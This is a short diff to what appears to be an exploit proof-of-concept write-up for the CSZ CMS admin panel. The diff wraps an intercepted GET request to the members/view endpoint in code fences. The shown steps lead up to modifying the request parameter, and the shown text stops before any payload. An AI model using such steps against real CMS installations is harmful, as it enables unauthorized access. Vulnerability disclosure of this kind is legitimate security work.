@@ -10,7 +10,7 @@ http://localhost/cszcms/admin/login
 # 3 Click the 'View' button next to any username.
 
 # 4 Intercept the request
-
+```
 GET /cszcms/admin/members/view/1 HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
@@ -20,7 +20,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Cookie: 86112035d26bb3c291899278f9ab4fb2_cszsess=n5v1jcdqfjuuo32ng66e4rttg65ugdss
 Upgrade-Insecure-Requests: 1
-
+```
 
 
 # 5 Modify the paramter 
